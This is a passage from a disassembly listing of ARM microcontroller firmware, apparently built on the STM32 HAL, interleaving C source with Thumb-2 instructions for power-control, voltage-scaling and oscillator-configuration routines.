 80039ac:	2201      	movs	r2, #1
 80039ae:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 80039b2:	687b      	ldr	r3, [r7, #4]
 80039b4:	2200      	movs	r2, #0
 80039b6:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 80039ba:	68fb      	ldr	r3, [r7, #12]
 80039bc:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80039c0:	b29b      	uxth	r3, r3
 80039c2:	f043 0301 	orr.w	r3, r3, #1
 80039c6:	b29a      	uxth	r2, r3
 80039c8:	68fb      	ldr	r3, [r7, #12]
 80039ca:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 80039ce:	68fb      	ldr	r3, [r7, #12]
 80039d0:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80039d4:	b29b      	uxth	r3, r3
 80039d6:	f043 0302 	orr.w	r3, r3, #2
 80039da:	b29a      	uxth	r2, r3
 80039dc:	68fb      	ldr	r3, [r7, #12]
 80039de:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 80039e2:	2300      	movs	r3, #0
}
 80039e4:	4618      	mov	r0, r3
 80039e6:	3714      	adds	r7, #20
 80039e8:	46bd      	mov	sp, r7
 80039ea:	f85d 7b04 	ldr.w	r7, [sp], #4
 80039ee:	4770      	bx	lr

080039f0 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 80039f0:	b480      	push	{r7}
 80039f2:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80039f4:	4b05      	ldr	r3, [pc, #20]	; (8003a0c <HAL_PWR_EnableBkUpAccess+0x1c>)
 80039f6:	681b      	ldr	r3, [r3, #0]
 80039f8:	4a04      	ldr	r2, [pc, #16]	; (8003a0c <HAL_PWR_EnableBkUpAccess+0x1c>)
 80039fa:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80039fe:	6013      	str	r3, [r2, #0]
}
 8003a00:	bf00      	nop
 8003a02:	46bd      	mov	sp, r7
 8003a04:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a08:	4770      	bx	lr
 8003a0a:	bf00      	nop
 8003a0c:	40007000 	.word	0x40007000

08003a10 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 8003a10:	b480      	push	{r7}
 8003a12:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 8003a14:	4b04      	ldr	r3, [pc, #16]	; (8003a28 <HAL_PWREx_GetVoltageRange+0x18>)
 8003a16:	681b      	ldr	r3, [r3, #0]
 8003a18:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 8003a1c:	4618      	mov	r0, r3
 8003a1e:	46bd      	mov	sp, r7
 8003a20:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003a24:	4770      	bx	lr
 8003a26:	bf00      	nop
 8003a28:	40007000 	.word	0x40007000

08003a2c <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 8003a2c:	b480      	push	{r7}
 8003a2e:	b085      	sub	sp, #20
 8003a30:	af00      	add	r7, sp, #0
 8003a32:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 8003a34:	687b      	ldr	r3, [r7, #4]
 8003a36:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003a3a:	d130      	bne.n	8003a9e <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 8003a3c:	4b23      	ldr	r3, [pc, #140]	; (8003acc <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a3e:	681b      	ldr	r3, [r3, #0]
 8003a40:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 8003a44:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003a48:	d038      	beq.n	8003abc <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 8003a4a:	4b20      	ldr	r3, [pc, #128]	; (8003acc <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a4c:	681b      	ldr	r3, [r3, #0]
 8003a4e:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003a52:	4a1e      	ldr	r2, [pc, #120]	; (8003acc <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a54:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8003a58:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 8003a5a:	4b1d      	ldr	r3, [pc, #116]	; (8003ad0 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 8003a5c:	681b      	ldr	r3, [r3, #0]
 8003a5e:	2232      	movs	r2, #50	; 0x32
 8003a60:	fb02 f303 	mul.w	r3, r2, r3
 8003a64:	4a1b      	ldr	r2, [pc, #108]	; (8003ad4 <HAL_PWREx_ControlVoltageScaling+0xa8>)
 8003a66:	fba2 2303 	umull	r2, r3, r2, r3
 8003a6a:	0c9b      	lsrs	r3, r3, #18
 8003a6c:	3301      	adds	r3, #1
 8003a6e:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003a70:	e002      	b.n	8003a78 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 8003a72:	68fb      	ldr	r3, [r7, #12]
 8003a74:	3b01      	subs	r3, #1
 8003a76:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003a78:	4b14      	ldr	r3, [pc, #80]	; (8003acc <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a7a:	695b      	ldr	r3, [r3, #20]
 8003a7c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003a80:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003a84:	d102      	bne.n	8003a8c <HAL_PWREx_ControlVoltageScaling+0x60>
 8003a86:	68fb      	ldr	r3, [r7, #12]
 8003a88:	2b00      	cmp	r3, #0
 8003a8a:	d1f2      	bne.n	8003a72 <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003a8c:	4b0f      	ldr	r3, [pc, #60]	; (8003acc <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003a8e:	695b      	ldr	r3, [r3, #20]
 8003a90:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003a94:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003a98:	d110      	bne.n	8003abc <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 8003a9a:	2303      	movs	r3, #3
 8003a9c:	e00f      	b.n	8003abe <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 8003a9e:	4b0b      	ldr	r3, [pc, #44]	; (8003acc <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003aa0:	681b      	ldr	r3, [r3, #0]
 8003aa2:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 8003aa6:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003aaa:	d007      	beq.n	8003abc <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 8003aac:	4b07      	ldr	r3, [pc, #28]	; (8003acc <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003aae:	681b      	ldr	r3, [r3, #0]
 8003ab0:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 8003ab4:	4a05      	ldr	r2, [pc, #20]	; (8003acc <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003ab6:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003aba:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 8003abc:	2300      	movs	r3, #0
}
 8003abe:	4618      	mov	r0, r3
 8003ac0:	3714      	adds	r7, #20
 8003ac2:	46bd      	mov	sp, r7
 8003ac4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003ac8:	4770      	bx	lr
 8003aca:	bf00      	nop
 8003acc:	40007000 	.word	0x40007000
 8003ad0:	20000000 	.word	0x20000000
 8003ad4:	431bde83 	.word	0x431bde83

08003ad8 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 8003ad8:	b480      	push	{r7}
 8003ada:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 8003adc:	4b05      	ldr	r3, [pc, #20]	; (8003af4 <HAL_PWREx_EnableVddUSB+0x1c>)
 8003ade:	685b      	ldr	r3, [r3, #4]
 8003ae0:	4a04      	ldr	r2, [pc, #16]	; (8003af4 <HAL_PWREx_EnableVddUSB+0x1c>)
 8003ae2:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003ae6:	6053      	str	r3, [r2, #4]
}
 8003ae8:	bf00      	nop
 8003aea:	46bd      	mov	sp, r7
 8003aec:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003af0:	4770      	bx	lr
 8003af2:	bf00      	nop
 8003af4:	40007000 	.word	0x40007000

08003af8 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 8003af8:	b580      	push	{r7, lr}
 8003afa:	b088      	sub	sp, #32
 8003afc:	af00      	add	r7, sp, #0
 8003afe:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 8003b00:	687b      	ldr	r3, [r7, #4]
 8003b02:	2b00      	cmp	r3, #0
 8003b04:	d102      	bne.n	8003b0c <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 8003b06:	2301      	movs	r3, #1
 8003b08:	f000 bc02 	b.w	8004310 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8003b0c:	4b96      	ldr	r3, [pc, #600]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003b0e:	689b      	ldr	r3, [r3, #8]
 8003b10:	f003 030c 	and.w	r3, r3, #12
 8003b14:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 8003b16:	4b94      	ldr	r3, [pc, #592]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003b18:	68db      	ldr	r3, [r3, #12]
 8003b1a:	f003 0303 	and.w	r3, r3, #3
 8003b1e:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 8003b20:	687b      	ldr	r3, [r7, #4]
 8003b22:	681b      	ldr	r3, [r3, #0]
 8003b24:	f003 0310 	and.w	r3, r3, #16
 8003b28:	2b00      	cmp	r3, #0
 8003b2a:	f000 80e4 	beq.w	8003cf6 <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8003b2e:	69bb      	ldr	r3, [r7, #24]
 8003b30:	2b00      	cmp	r3, #0
 8003b32:	d007      	beq.n	8003b44 <HAL_RCC_OscConfig+0x4c>
 8003b34:	69bb      	ldr	r3, [r7, #24]
 8003b36:	2b0c      	cmp	r3, #12
 8003b38:	f040 808b 	bne.w	8003c52 <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 8003b3c:	697b      	ldr	r3, [r7, #20]
 8003b3e:	2b01      	cmp	r3, #1
 8003b40:	f040 8087 	bne.w	8003c52 <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003b44:	4b88      	ldr	r3, [pc, #544]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003b46:	681b      	ldr	r3, [r3, #0]
 8003b48:	f003 0302 	and.w	r3, r3, #2
 8003b4c:	2b00      	cmp	r3, #0
 8003b4e:	d005      	beq.n	8003b5c <HAL_RCC_OscConfig+0x64>
 8003b50:	687b      	ldr	r3, [r7, #4]
 8003b52:	699b      	ldr	r3, [r3, #24]
 8003b54:	2b00      	cmp	r3, #0
 8003b56:	d101      	bne.n	8003b5c <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 8003b58:	2301      	movs	r3, #1
 8003b5a:	e3d9      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003b5c:	687b      	ldr	r3, [r7, #4]
 8003b5e:	6a1a      	ldr	r2, [r3, #32]
 8003b60:	4b81      	ldr	r3, [pc, #516]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003b62:	681b      	ldr	r3, [r3, #0]
 8003b64:	f003 0308 	and.w	r3, r3, #8
 8003b68:	2b00      	cmp	r3, #0
 8003b6a:	d004      	beq.n	8003b76 <HAL_RCC_OscConfig+0x7e>
 8003b6c:	4b7e      	ldr	r3, [pc, #504]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003b6e:	681b      	ldr	r3, [r3, #0]
 8003b70:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003b74:	e005      	b.n	8003b82 <HAL_RCC_OscConfig+0x8a>
 8003b76:	4b7c      	ldr	r3, [pc, #496]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003b78:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003b7c:	091b      	lsrs	r3, r3, #4
 8003b7e:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003b82:	4293      	cmp	r3, r2
 8003b84:	d223      	bcs.n	8003bce <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003b86:	687b      	ldr	r3, [r7, #4]
 8003b88:	6a1b      	ldr	r3, [r3, #32]
 8003b8a:	4618      	mov	r0, r3
 8003b8c:	f000 fd8c 	bl	80046a8 <RCC_SetFlashLatencyFromMSIRange>
 8003b90:	4603      	mov	r3, r0
 8003b92:	2b00      	cmp	r3, #0
 8003b94:	d001      	beq.n	8003b9a <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 8003b96:	2301      	movs	r3, #1
 8003b98:	e3ba      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003b9a:	4b73      	ldr	r3, [pc, #460]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003b9c:	681b      	ldr	r3, [r3, #0]
 8003b9e:	4a72      	ldr	r2, [pc, #456]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003ba0:	f043 0308 	orr.w	r3, r3, #8
 8003ba4:	6013      	str	r3, [r2, #0]
 8003ba6:	4b70      	ldr	r3, [pc, #448]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003ba8:	681b      	ldr	r3, [r3, #0]
 8003baa:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003bae:	687b      	ldr	r3, [r7, #4]
 8003bb0:	6a1b      	ldr	r3, [r3, #32]
 8003bb2:	496d      	ldr	r1, [pc, #436]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003bb4:	4313      	orrs	r3, r2
 8003bb6:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003bb8:	4b6b      	ldr	r3, [pc, #428]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003bba:	685b      	ldr	r3, [r3, #4]
 8003bbc:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003bc0:	687b      	ldr	r3, [r7, #4]
 8003bc2:	69db      	ldr	r3, [r3, #28]
 8003bc4:	021b      	lsls	r3, r3, #8
 8003bc6:	4968      	ldr	r1, [pc, #416]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003bc8:	4313      	orrs	r3, r2
 8003bca:	604b      	str	r3, [r1, #4]
 8003bcc:	e025      	b.n	8003c1a <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003bce:	4b66      	ldr	r3, [pc, #408]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003bd0:	681b      	ldr	r3, [r3, #0]
 8003bd2:	4a65      	ldr	r2, [pc, #404]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003bd4:	f043 0308 	orr.w	r3, r3, #8
 8003bd8:	6013      	str	r3, [r2, #0]
 8003bda:	4b63      	ldr	r3, [pc, #396]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003bdc:	681b      	ldr	r3, [r3, #0]
 8003bde:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003be2:	687b      	ldr	r3, [r7, #4]
 8003be4:	6a1b      	ldr	r3, [r3, #32]
 8003be6:	4960      	ldr	r1, [pc, #384]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003be8:	4313      	orrs	r3, r2
 8003bea:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003bec:	4b5e      	ldr	r3, [pc, #376]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003bee:	685b      	ldr	r3, [r3, #4]
 8003bf0:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003bf4:	687b      	ldr	r3, [r7, #4]
 8003bf6:	69db      	ldr	r3, [r3, #28]
 8003bf8:	021b      	lsls	r3, r3, #8
 8003bfa:	495b      	ldr	r1, [pc, #364]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003bfc:	4313      	orrs	r3, r2
 8003bfe:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 8003c00:	69bb      	ldr	r3, [r7, #24]
 8003c02:	2b00      	cmp	r3, #0
 8003c04:	d109      	bne.n	8003c1a <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003c06:	687b      	ldr	r3, [r7, #4]
 8003c08:	6a1b      	ldr	r3, [r3, #32]
 8003c0a:	4618      	mov	r0, r3
 8003c0c:	f000 fd4c 	bl	80046a8 <RCC_SetFlashLatencyFromMSIRange>
 8003c10:	4603      	mov	r3, r0
 8003c12:	2b00      	cmp	r3, #0
 8003c14:	d001      	beq.n	8003c1a <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 8003c16:	2301      	movs	r3, #1
 8003c18:	e37a      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8003c1a:	f000 fc81 	bl	8004520 <HAL_RCC_GetSysClockFreq>
 8003c1e:	4602      	mov	r2, r0
 8003c20:	4b51      	ldr	r3, [pc, #324]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003c22:	689b      	ldr	r3, [r3, #8]
 8003c24:	091b      	lsrs	r3, r3, #4
 8003c26:	f003 030f 	and.w	r3, r3, #15
 8003c2a:	4950      	ldr	r1, [pc, #320]	; (8003d6c <HAL_RCC_OscConfig+0x274>)
 8003c2c:	5ccb      	ldrb	r3, [r1, r3]
 8003c2e:	f003 031f 	and.w	r3, r3, #31
 8003c32:	fa22 f303 	lsr.w	r3, r2, r3
 8003c36:	4a4e      	ldr	r2, [pc, #312]	; (8003d70 <HAL_RCC_OscConfig+0x278>)
 8003c38:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 8003c3a:	4b4e      	ldr	r3, [pc, #312]	; (8003d74 <HAL_RCC_OscConfig+0x27c>)
 8003c3c:	681b      	ldr	r3, [r3, #0]
 8003c3e:	4618      	mov	r0, r3
 8003c40:	f7fd fb86 	bl	8001350 <HAL_InitTick>
 8003c44:	4603      	mov	r3, r0
 8003c46:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 8003c48:	7bfb      	ldrb	r3, [r7, #15]
 8003c4a:	2b00      	cmp	r3, #0
 8003c4c:	d052      	beq.n	8003cf4 <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003c4e:	7bfb      	ldrb	r3, [r7, #15]
 8003c50:	e35e      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 8003c52:	687b      	ldr	r3, [r7, #4]
 8003c54:	699b      	ldr	r3, [r3, #24]
 8003c56:	2b00      	cmp	r3, #0
 8003c58:	d032      	beq.n	8003cc0 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003c5a:	4b43      	ldr	r3, [pc, #268]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003c5c:	681b      	ldr	r3, [r3, #0]
 8003c5e:	4a42      	ldr	r2, [pc, #264]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003c60:	f043 0301 	orr.w	r3, r3, #1
 8003c64:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003c66:	f7fd fbc3 	bl	80013f0 <HAL_GetTick>
 8003c6a:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003c6c:	e008      	b.n	8003c80 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003c6e:	f7fd fbbf 	bl	80013f0 <HAL_GetTick>
 8003c72:	4602      	mov	r2, r0
 8003c74:	693b      	ldr	r3, [r7, #16]
 8003c76:	1ad3      	subs	r3, r2, r3
 8003c78:	2b02      	cmp	r3, #2
 8003c7a:	d901      	bls.n	8003c80 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003c7c:	2303      	movs	r3, #3
 8003c7e:	e347      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003c80:	4b39      	ldr	r3, [pc, #228]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003c82:	681b      	ldr	r3, [r3, #0]
 8003c84:	f003 0302 	and.w	r3, r3, #2
 8003c88:	2b00      	cmp	r3, #0
 8003c8a:	d0f0      	beq.n	8003c6e <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003c8c:	4b36      	ldr	r3, [pc, #216]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003c8e:	681b      	ldr	r3, [r3, #0]
 8003c90:	4a35      	ldr	r2, [pc, #212]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003c92:	f043 0308 	orr.w	r3, r3, #8
 8003c96:	6013      	str	r3, [r2, #0]
 8003c98:	4b33      	ldr	r3, [pc, #204]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003c9a:	681b      	ldr	r3, [r3, #0]
 8003c9c:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003ca0:	687b      	ldr	r3, [r7, #4]
 8003ca2:	6a1b      	ldr	r3, [r3, #32]
 8003ca4:	4930      	ldr	r1, [pc, #192]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003ca6:	4313      	orrs	r3, r2
 8003ca8:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003caa:	4b2f      	ldr	r3, [pc, #188]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003cac:	685b      	ldr	r3, [r3, #4]
 8003cae:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003cb2:	687b      	ldr	r3, [r7, #4]
 8003cb4:	69db      	ldr	r3, [r3, #28]
 8003cb6:	021b      	lsls	r3, r3, #8
 8003cb8:	492b      	ldr	r1, [pc, #172]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003cba:	4313      	orrs	r3, r2
 8003cbc:	604b      	str	r3, [r1, #4]
 8003cbe:	e01a      	b.n	8003cf6 <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003cc0:	4b29      	ldr	r3, [pc, #164]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003cc2:	681b      	ldr	r3, [r3, #0]
 8003cc4:	4a28      	ldr	r2, [pc, #160]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003cc6:	f023 0301 	bic.w	r3, r3, #1
 8003cca:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003ccc:	f7fd fb90 	bl	80013f0 <HAL_GetTick>
 8003cd0:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003cd2:	e008      	b.n	8003ce6 <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003cd4:	f7fd fb8c 	bl	80013f0 <HAL_GetTick>
 8003cd8:	4602      	mov	r2, r0
 8003cda:	693b      	ldr	r3, [r7, #16]
 8003cdc:	1ad3      	subs	r3, r2, r3
 8003cde:	2b02      	cmp	r3, #2
 8003ce0:	d901      	bls.n	8003ce6 <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003ce2:	2303      	movs	r3, #3
 8003ce4:	e314      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003ce6:	4b20      	ldr	r3, [pc, #128]	; (8003d68 <HAL_RCC_OscConfig+0x270>)
 8003ce8:	681b      	ldr	r3, [r3, #0]
 8003cea:	f003 0302 	and.w	r3, r3, #2
 8003cee:	2b00      	cmp	r3, #0
